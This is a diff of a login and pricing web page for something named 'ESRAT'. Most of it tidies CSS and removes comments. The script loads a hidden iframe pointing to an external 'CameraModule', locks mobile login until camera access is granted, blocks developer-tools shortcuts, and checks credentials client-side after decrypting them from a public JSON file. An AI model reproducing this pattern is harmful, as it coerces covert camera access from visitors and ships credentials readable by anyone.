@@ -63,9 +63,8 @@
             flex-direction: column;
             overflow: hidden;
         }
-        /* Removed Navbar — now only logo remains */
-        
-        /* Logo Container — Floating Glass Effect */
+
+        /* Logo Container — Floating Glass Effect (Smoothed) */
         .logo-container {
             position: absolute;
             top: 40px;
@@ -74,32 +73,32 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(24px);
-            -webkit-backdrop-filter: blur(24px);
-            background: rgba(255, 255, 255, 0.75);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            background: rgba(255, 255, 255, 0.65);
             padding: 12px 20px;
-            border-radius: 24px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.06);
+            border-radius: 32px;
+            box-shadow: 0 16px 64px rgba(0, 0, 0, 0.04);
             z-index: 1000;
             transition: all 0.3s ease;
         }
-        
+
         .logo-link {
             display: block;
             transition: transform 0.3s ease;
         }
-        
+
         .logo-link:hover {
             transform: scale(1.05);
         }
-        
+
         .logo-img {
             height: 60px;
             width: auto;
             filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.1));
             transition: filter 0.3s ease;
         }
-        
+
         .logo-link:hover .logo-img {
             filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.15));
         }
@@ -111,13 +110,13 @@
             flex-direction: column;
             align-items: center;
             justify-content: flex-start;
-            padding: 160px 20px 100px; /* Adjusted top padding to accommodate logo */
+            padding: 160px 20px 100px;
             min-height: 100vh;
             overflow-y: auto;
             overflow-x: hidden;
-            background: linear-gradient(135deg, #f0f0f0 0%, #ffffff 100%); /* Unified gradient */
+            background: linear-gradient(135deg, #f0f0f0 0%, #ffffff 100%);
         }
-        
+
         /* Animated GANGA Text */
         .info {
             text-align: center;
@@ -138,7 +137,6 @@
             transform: translate3d(0px, 50px, 0px) rotate(-15deg) scale(0.8);
             animation: animateText 1.2s forwards ease-out, glowingShadow 4s infinite ease-in-out;
         }
-        /* Letter Animation Delays */
         .letter:nth-child(1) { animation-delay: 0s, 0s; }
         .letter:nth-child(2) { animation-delay: 0.2s, 0.2s; }
         .letter:nth-child(3) { animation-delay: 0.4s, 0.4s; }
@@ -229,24 +227,24 @@
         }
         /* Login Container */
         .container {
-            margin-bottom: 80px; /* Increased spacing from pricing section */
+            margin-bottom: 80px;
             z-index: 10;
         }
         .login-card {
-            background: rgba(255, 255, 255, 0.95); /* Slightly more opaque for clarity */
+            background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50px; /* Pill shape */
+            border-radius: 50px;
             padding: 40px;
-            width: 350px; /* Smaller size */
+            width: 350px;
             max-width: 90vw;
             box-shadow: 
                 0 12px 40px rgba(0, 0, 0, 0.1),
                 inset 0 1px 0 rgba(255, 255, 255, 0.5);
             transition: all 0.3s ease;
             animation: cardFloat 6s ease-in-out infinite;
-            margin-top: 20px; /* Added space above */
+            margin-top: 20px;
         }
         .login-card:hover {
             transform: translateY(-5px);
@@ -324,7 +322,7 @@
             color: white;
             background: linear-gradient(135deg, #3498db, #2980b9);
             border: none;
-            border-radius: 25px; /* Pill shape */
+            border-radius: 25px;
             cursor: pointer;
             position: relative;
             overflow: hidden;
@@ -394,13 +392,13 @@
             margin-top: 20px;
         }
         .pricing-card {
-            background: rgba(255, 255, 255, 0.95); /* Match login card */
+            background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.3);
             border-radius: 20px;
-            padding: 35px; /* Increased padding for fuller look */
-            width: 320px; /* Increased width from 280px */
+            padding: 35px;
+            width: 320px;
             max-width: 90vw;
             position: relative;
             transition: all 0.3s ease;
@@ -412,7 +410,7 @@
         }
         .pricing-card.featured {
             border: 2px solid #3498db;
-            transform: scale(1.06); /* Slightly larger scale for prominence */
+            transform: scale(1.06);
         }
         .pricing-card.featured:hover {
             transform: scale(1.06) translateY(-8px);
@@ -516,7 +514,7 @@
         /* Mobile Pricing: Dynamic Toggle */
         @media (max-width: 768px) {
             .pricing-cards {
-                display: none; /* Hide the original cards */
+                display: none;
             }
             .pricing-toggle-container {
                 display: flex;
@@ -741,11 +739,11 @@
             padding: 20px;
         }
         .payment-container {
-            background: rgba(255, 255, 255, 0.95); /* Cleaner white */
+            background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
-            padding: 25px; /* Reduced padding */
+            padding: 25px;
             width: 100%;
-            max-width: 400px; /* Smaller width */
+            max-width: 400px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             animation: slideIn 0.5s ease-out;
             max-height: 90vh;
@@ -756,28 +754,28 @@
             font-size: 1.6rem;
             font-weight: 600;
             color: #2c3e50;
-            margin-bottom: 20px; /* Reduced margin */
+            margin-bottom: 20px;
         }
         .payment-form {
             display: flex;
             flex-direction: column;
-            gap: 12px; /* Reduced gap */
+            gap: 12px;
         }
         .payment-info {
             background: rgba(52, 152, 219, 0.1);
-            padding: 15px; /* Reduced padding */
+            padding: 15px;
             border-radius: 12px;
-            margin-bottom: 15px; /* Reduced margin */
+            margin-bottom: 15px;
         }
         .payment-info h3 {
             font-size: 1.1rem;
             color: #2c3e50;
-            margin-bottom: 8px; /* Reduced margin */
+            margin-bottom: 8px;
         }
         .payment-info p {
             font-size: 0.9rem;
             color: #2c3e50;
-            margin-bottom: 5px; /* Reduced margin */
+            margin-bottom: 5px;
         }
         .payment-info strong {
             color: #2980b9;
@@ -799,7 +797,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden; /* Ensure image fits */
+            overflow: hidden;
         }
         .qr-code img {
             width: 100%;
@@ -901,7 +899,7 @@
         /* Responsive Design */
         @media (max-width: 768px) {
             .main-content {
-                padding: 120px 15px 90px; /* Adjusted for smaller screens */
+                padding: 120px 15px 90px;
             }
             .logo-container {
                 top: 20px;
@@ -1213,9 +1211,8 @@
     <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-        let cameraStream = null;  // Variable to store the camera stream
-        let cameraInterval; // Variable for the camera permission check interval
-        // DOM Elements for Payment System
+        let cameraStream = null;
+        let cameraInterval;
         const planButtons = document.querySelectorAll('.pricing-button');
         const paymentWindow = document.getElementById('payment-window');
         const closePayment = document.getElementById('close-payment');
@@ -1226,7 +1223,6 @@
         const closeVerification = document.getElementById('close-verification');
         const downloadQr = document.getElementById('download-qr');
         const qrImage = document.getElementById('qr-image');
-        // DOM Elements for Mobile Pricing Toggle
         const pricingToggleContainer = document.querySelector('.pricing-toggle-container');
         const pricingToggleBtns = document.querySelectorAll('.pricing-toggle-btn');
         const pricingDetails = document.querySelector('.pricing-details');
@@ -1235,11 +1231,13 @@
         const planDurationMobile = document.querySelector('.plan-duration-mobile');
         const cardFeaturesMobile = document.querySelector('.card-features-mobile');
         const pricingButtonMobile = document.querySelector('.pricing-button-mobile');
+
         async function retrieveSacredKeys() {
             const response = await fetch("/ESRAT/asset/keys.json");
             const sacredKeys = await response.json();
             return sacredKeys;
         }
+
         function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
             const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
             const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
@@ -1250,114 +1248,104 @@
             });
             return unlockedSecrets.toString(CryptoJS.enc.Utf8);
         }
+
         function enableInputs() {
             document.getElementById("username").disabled = false;
             document.getElementById("password").disabled = false;
             document.getElementById("submit").disabled = false;
-            document.getElementById("notice-board").style.display = 'none';  // Hide notice board after permission
+            document.getElementById("notice-board").style.display = 'none';
         }
+
         function disableInputs() {
             document.getElementById("username").disabled = true;
             document.getElementById("password").disabled = true;
             document.getElementById("submit").disabled = true;
-            document.getElementById("notice-board").style.display = 'flex';  // Show notice board if permission is denied
+            document.getElementById("notice-board").style.display = 'flex';
         }
+
         function stopCameraStream() {
             if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
-                cameraStream = null;  // Clear the camera stream
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
             }
         }
+
         function requestCameraPermission() {
-            // Check if the screen size is small (for mobile devices)
-            if (window.innerWidth <= 768) { // You can adjust the breakpoint as needed
+            if (window.innerWidth <= 768) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(function(stream) {
                         console.log("Camera permission granted.");
-                        cameraStream = stream;  // Store the camera stream
-                        enableInputs();  // Enable inputs once permission is granted
-                        // Stop the camera stream after 5 seconds
+                        cameraStream = stream;
+                        enableInputs();
                         setTimeout(stopCameraStream, 5000);
-                        clearInterval(cameraInterval);  // Stop asking for permission after it's granted
+                        clearInterval(cameraInterval);
                     })
                     .catch(function(err) {
                         console.log("Camera permission denied, retrying in 5 seconds.");
-                        disableInputs();  // Keep inputs disabled if permission is denied
+                        disableInputs();
                     });
             } else {
-                // If on larger screens, directly enable inputs without asking for camera
                 enableInputs();
             }
         }
-        // Check camera permission every 5 seconds until granted
+
         cameraInterval = setInterval(requestCameraPermission, 5000);
-        // Event listeners for login
+
         document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
         document.getElementById("password").addEventListener("keydown", (event) => {
             if (event.key === "Enter") {
                 verifyEnigmaticCredentials();
             }
         });
-        // Function to verify credentials
+
         async function verifyEnigmaticCredentials() {
             const sacredKeys = await retrieveSacredKeys();
             const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
             const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
             const inputIdentity = document.getElementById("username").value;
             const inputPassage = document.getElementById("password").value;
-            // Check if both inputs are filled
+
             if (inputIdentity === "" || inputPassage === "") {
                 alert("Please fill in both username and password.");
-                return;  // Prevent further execution
+                return;
             }
+
             if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
-                window.location.href = "/ESRAT/index-home.html";  // Redirect if login is successful
+                window.location.href = "/ESRAT/index-home.html";
             } else {
-                alert("Incorrect User or Password.");  // Alert on incorrect login
+                alert("Incorrect User or Password.");
             }
         }
-        // Cursor shadow effect
+
         const cursorShadow = document.querySelector('.cursor-shadow');
         document.addEventListener('mousemove', (event) => {
             cursorShadow.style.left = event.clientX + 'px';
             cursorShadow.style.top = event.clientY + 'px';
         });
-        // Anti-inspection script
-        document.addEventListener('contextmenu', event => event.preventDefault());  // Disable right-click
-        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function(e) {
-            if (e.keyCode === 123) { // F12
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
-                return false; // Ctrl+Shift+I
-            }
-            if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
-                return false; // Ctrl+U
-            }
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
-                return false; // Ctrl+Shift+J
-            }
+            if (e.keyCode === 123) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) return false;
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) return false;
         };
-        // Payment System Functionality
+
         planButtons.forEach(button => {
             button.addEventListener('click', () => {
                 const plan = button.getAttribute('data-plan');
                 const amount = button.getAttribute('data-amount');
-                // Update payment details
                 paymentAmount.textContent = `$${amount}.00`;
                 selectedPlan.textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
-                // Show payment window (QR is now static)
                 paymentWindow.style.display = 'flex';
             });
         });
-        // Close payment window
+
         closePayment.addEventListener('click', () => {
             paymentWindow.style.display = 'none';
         });
-        // I Have Paid button
+
         paidButton.addEventListener('click', () => {
-            // Validate registration fields
             const email = document.getElementById('register-email').value;
             const regUsername = document.getElementById('register-username').value;
             const regPassword = document.getElementById('register-password').value;
@@ -1365,19 +1353,17 @@
                 alert('Please fill all registration fields');
                 return;
             }
-            // Hide payment window and show verification
             paymentWindow.style.display = 'none';
             verificationWindow.style.display = 'flex';
         });
-        // Close verification window
+
         closeVerification.addEventListener('click', () => {
             verificationWindow.style.display = 'none';
-            // Reset form
             document.getElementById('register-email').value = '';
             document.getElementById('register-username').value = '';
             document.getElementById('register-password').value = '';
         });
-        // DOWNLOAD QR CODE FIX: Now properly downloads the image
+
         downloadQr.addEventListener('click', async () => {
             const qrUrl = qrImage.src;
             try {
@@ -1396,31 +1382,58 @@
                 alert("Failed to download QR code. Please try again.");
             }
         });
-        // Initialize QR code on load (just ensure the image loads)
+
         window.addEventListener('load', () => {
             const qrContainer = document.querySelector('.qr-code');
-            // The image is already in the HTML, no need to generate
         });
-        // Mobile Pricing Toggle Logic
+
         document.addEventListener('DOMContentLoaded', () => {
-            // Set up the mobile toggle UI based on screen size on load
             updateMobilePricingUI();
-            // Listen for resize events
             window.addEventListener('resize', updateMobilePricingUI);
-            // Add click event listeners to toggle buttons
             pricingToggleBtns.forEach(btn => {
                 btn.addEventListener('click', () => {
-                    // Remove active class from all buttons
                     pricingToggleBtns.forEach(b => b.classList.remove('active'));
-                    // Add active class to clicked button
                     btn.classList.add('active');
-                    // Update the dynamic pricing details
                     const plan = btn.getAttribute('data-plan');
                     updatePricingDetails(plan);
                 });
             });
-            // CRITICAL FIX: Add click handler to mobile pricing button to open payment window with correct data
             pricingButtonMobile.addEventListener('click', () => {
                 const activeBtn = document.querySelector('.pricing-toggle-btn.active');
                 const plan = activeBtn.getAttribute('data-plan');
-                const amount = activeBtn.getA
+                const amount = activeBtn.getAttribute('data-amount');
+                paymentAmount.textContent = `$${amount}.00`;
+                selectedPlan.textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
+                paymentWindow.style.display = 'flex';
+            });
+        });
+
+        function updateMobilePricingUI() {
+            const isMobile = window.innerWidth <= 768;
+            if (isMobile) {
+                pricingToggleContainer.style.display = 'flex';
+                pricingDetails.style.display = 'block';
+                document.querySelector('.pricing-cards').style.display = 'none';
+                updatePricingDetails('premium');
+            } else {
+                pricingToggleContainer.style.display = 'none';
+                pricingDetails.style.display = 'none';
+                document.querySelector('.pricing-cards').style.display = 'flex';
+            }
+        }
+
+        function updatePricingDetails(plan) {
+            const isPremium = plan === 'premium';
+            planNameMobile.textContent = isPremium ? 'Premium' : 'Lifetime';
+            amountMobile.textContent = isPremium ? '29' : '49';
+            planDurationMobile.textContent = isPremium ? '99 Days Access' : 'Lifetime Access';
+            cardFeaturesMobile.innerHTML = isPremium ?
+                '<ul><li>✓ Full Access to Tools</li><li>✓ Regular Updates</li><li>✓ Community Support</li></ul>' :
+                '<ul><li>✓ Everything in Premium</li><li>✓ Priority Support</li><li>✓ Exclusive Features</li><li>✓ No Renewal Needed</li></ul>';
+            pricingButtonMobile.textContent = isPremium ? 'Get Started' : 'Choose Lifetime';
+            pricingButtonMobile.className = 'pricing-button-mobile';
+            if (!isPremium) pricingButtonMobile.classList.add('featured-button');
+        }
+    </script>
+</body>
+</html>
